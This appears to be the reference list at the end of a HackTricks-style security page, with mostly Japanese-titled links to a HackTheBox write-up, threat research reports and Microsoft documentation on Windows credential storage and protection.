- [2] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServerの認証情報の復号 → Veeam CVE-2023-27532によるSYSTEM権限の取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragonの内部：リレーネットワークとステルス性の高い攻撃活動の内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: パスワードレス認証における新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windowsハッキング：Microsoftのシステムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directoryのデータストアの実際の仕組み：NTDS.ditの内部（パート1）](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - リモートでのLsassダンプによるパスワード取得](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho、Still Toolkitでサイバースパイ活動の武器を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW関数と`FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopyの`/B`バックアップモード](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential GuardとRestricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: 認証情報の保護と管理](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
